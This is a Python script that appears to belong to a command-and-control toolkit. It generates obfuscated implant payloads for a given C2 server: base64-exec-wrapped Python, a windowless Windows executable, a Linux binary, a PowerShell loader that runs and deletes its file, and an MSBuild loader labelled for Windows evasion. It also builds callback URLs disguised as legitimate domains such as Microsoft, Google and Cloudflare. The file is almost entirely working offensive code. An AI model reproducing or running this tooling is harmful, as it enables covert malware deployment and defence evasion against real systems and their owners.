#!/usr/bin/env python3
import os
import sys
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class PayloadGenerator:
    def __init__(self, server_url, output_dir="./payloads"):
        self.server_url = server_url
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_python_implant(self, output_name="implant.py"):
        """Generate Python implant with obfuscation"""
        
        # Read base implant code
        with open("agent/implant.py", "r") as f:
            implant_code = f.read()
        
        # Replace server URL
        implant_code = implant_code.replace("SERVER_URL", f'"{self.server_url}"')
        
        # Add obfuscation
        obfuscated = self.obfuscate_python(implant_code)
        
        # Save payload
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(obfuscated)
        
        return output_path
    
    def generate_windows_executable(self, output_name="implant.exe"):
        """Generate Windows executable using PyInstaller"""
        implant_path = self.generate_python_implant("temp_implant.py")
        
        # Build executable
        os.system(f"pyinstaller --onefile --noconsole --name {output_name.replace('.exe', '')} {implant_path}")
        
        # Cleanup
        os.remove(implant_path)
        
        return f"dist/{output_name}"
    
    def generate_linux_binary(self, output_name="implant.bin"):
        """Generate Linux binary"""
        implant_path = self.generate_python_implant("temp_implant.py")
        
        # Compile with Nuitka or Cython
        os.system(f"cython --embed -o implant.c {implant_path}")
        os.system(f"gcc -Os -I/usr/include/python3.8 implant.c -lpython3.8 -o {output_name}")
        
        os.remove(implant_path)
        os.remove("implant.c")
        
        return output_name
    
    def generate_powershell_loader(self, output_name="loader.ps1"):
        """Generate PowerShell loader script"""
        with open("agent/implant.py", "r") as f:
            implant_code = f.read()
        
        # Encode implant as base64
        encoded_implant = base64.b64encode(implant_code.encode()).decode()
        
        # Create PowerShell script
        ps_script = f'''
$implantCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded_implant}"))
$tempFile = [System.IO.Path]::GetTempFileName() + ".py"
$implantCode | Out-File -FilePath $tempFile -Encoding UTF8
python $tempFile
Start-Sleep -Seconds 5
Remove-Item $tempFile
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(ps_script)
        
        return output_path
    
    def generate_msbuild_loader(self, output_name="loader.xml"):
        """Generate MSBuild loader for Windows evasion"""
        with open("agent/implant.py", "r") as f:
            implant_code = f.read()
        
        encoded = base64.b64encode(implant_code.encode()).decode()
        
        msbuild_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <Exec Command="python -c "import base64;exec(base64.b64decode('{encoded}').decode())"" />
  </Target>
</Project>'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(msbuild_xml)
        
        return output_path
    
    def obfuscate_python(self, code):
        """Simple Python obfuscation"""
        # Remove comments and docstrings
        lines = code.split('\n')
        obfuscated_lines = []
        in_string = False
        
        for line in lines:
            if not in_string and line.strip().startswith('#'):
                continue
            obfuscated_lines.append(line)
        
        # Base64 encode and wrap in exec
        encoded = base64.b64encode('\n'.join(obfuscated_lines).encode()).decode()
        
        obfuscated = f'''import base64;exec(base64.b64decode("{encoded}").decode())'''
        
        return obfuscated
    
    def generate_callback_urls(self, num_urls=5):
        """Generate multiple callback URLs for redundancy"""
        domains = [
            "update.microsoft.com",
            "api.google-analytics.com",
            "cdn.cloudflare.com",
            "images.unsplash.com",
            "fonts.googleapis.com"
        ]
        
        urls = []
        for i in range(num_urls):
            domain = random.choice(domains)
            path = ''.join(random.choices(string.ascii_lowercase, k=10))
            urls.append(f"https://{domain}/{path}")
        
        return urls

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python payload_generator.py <c2_server_url>")
        sys.exit(1)
    
    generator = PayloadGenerator(sys.argv[1])
    
    print("[*] Generating payloads...")
    print(f"[+] Python implant: {generator.generate_python_implant()}")
    print(f"[+] PowerShell loader: {generator.generate_powershell_loader()}")
    print(f"[+] MSBuild loader: {generator.generate_msbuild_loader()}")
    
    if os.name == 'nt':
        print(f"[+] Windows executable: {generator.generate_windows_executable()}")
    elif os.name == 'posix':
        print(f"[+] Linux binary: {generator.generate_linux_binary()}")
